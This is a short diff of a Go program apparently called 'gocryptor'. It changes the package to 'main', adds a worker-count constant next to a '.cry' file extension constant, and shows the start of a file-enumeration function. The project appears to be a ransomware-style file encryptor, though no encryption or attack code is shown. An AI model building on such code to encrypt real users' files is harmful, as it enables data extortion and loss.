@@ -1,4 +1,4 @@
-package gocryptor
+package main
 
 import (
 	"os"
@@ -7,6 +7,7 @@ import (
 
 const (
 	newExtention = ".cry"
+	workerNum    = 20
 )
 
 func enumFiles(root string) ([]string, error) {
